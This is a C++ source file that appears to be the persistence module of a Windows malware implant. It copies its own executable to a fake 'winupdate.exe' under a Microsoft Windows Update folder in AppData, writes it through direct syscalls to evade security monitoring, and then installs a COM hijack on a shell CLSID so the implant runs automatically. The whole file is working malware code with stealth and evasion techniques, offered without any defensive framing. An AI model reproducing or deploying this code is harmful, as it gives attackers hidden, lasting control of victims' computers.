#include "Persistence.h"
#include "ComHijacker.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>

namespace persistence {

namespace {

std::wstring getExecutablePath() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

std::wstring getPersistPath() {
    wchar_t localAppData[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) != S_OK) {
        return L"";
    }

    std::wstring dir = std::wstring(localAppData) + L"\\Microsoft\\Windows\\Update";
    // We can use a Win32 call for directory creation as it's less suspicious than registry
    // but for full stealth we could use NtCreateFile.
    CreateDirectoryW(dir.c_str(), NULL);

    return dir + L"\\winupdate.exe";
}

bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data) {
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
    DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    if (ntCreateFileSsn == 0xFFFFFFFF || ntWriteFileSsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;

    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)ntPath.c_str();
    uPath.Length = (USHORT)(ntPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS status = InternalDoSyscall(ntCreateFileSsn,
        &hFile,
        (PVOID)(UINT_PTR)(FILE_GENERIC_WRITE | SYNCHRONIZE),
        &objAttr,
        &ioStatus,
        NULL,
        (PVOID)(UINT_PTR)FILE_ATTRIBUTE_NORMAL,
        0,
        (PVOID)(UINT_PTR)FILE_OVERWRITE_IF,
        (PVOID)(UINT_PTR)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE),
        NULL,
        (PVOID)(UINT_PTR)0);

    if (!NT_SUCCESS(status)) return false;

    status = InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (PVOID)(UINT_PTR)(ULONG)data.size(), NULL, NULL, NULL, NULL);

    InternalDoSyscall(ntCloseSsn, hFile, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return NT_SUCCESS(status);
}

std::vector<BYTE> ReadFileBinary(const std::wstring& path) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return {};

    DWORD size = GetFileSize(hFile, NULL);
    std::vector<BYTE> buffer(size);
    DWORD read = 0;
    ReadFile(hFile, buffer.data(), size, &read, NULL);
    CloseHandle(hFile);
    return buffer;
}

} // namespace

bool establishPersistence() {
    std::wstring sourcePath = getExecutablePath();
    std::wstring persistPath = getPersistPath();

    if (persistPath.empty()) {
        LOG_ERR("Persist path is empty");
        return false;
    }

    LOG_DEBUG("Source Path: " + utils::ws2s(sourcePath));
    LOG_DEBUG("Persist Path: " + utils::ws2s(persistPath));

    // Check if we are already running from the persistence path
    if (lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0) {
        LOG_INFO("Running from persistence path. Skipping installation.");
        return false;
    }

    // Read self
    std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
    if (selfData.empty()) {
        LOG_ERR("Failed to read self");
        return false;
    }

    // Write to persist location via syscalls
    std::wstring ntPersistPath = L"\\??\\" + persistPath;
    if (SyscallWriteFile(ntPersistPath, selfData)) {
        LOG_INFO("Implant copied via syscalls to " + utils::ws2s(persistPath));
    } else {
        LOG_WARN("SyscallWriteFile failed, falling back to CopyFileW");
        CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE);
    }

    // Stealthy COM Hijack: Folder Background menu
    // {00021400-0000-0000-C000-000000000046}
    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";

    LOG_INFO("Attempting COM Hijack for " + utils::ws2s(clsid));
    if (ComHijacker::Install(persistPath, clsid)) {
        LOG_INFO("COM Hijack installed successfully.");
        return true;
    }

    LOG_ERR("COM Hijack installation failed.");
    return false;
}

} // namespace persistence
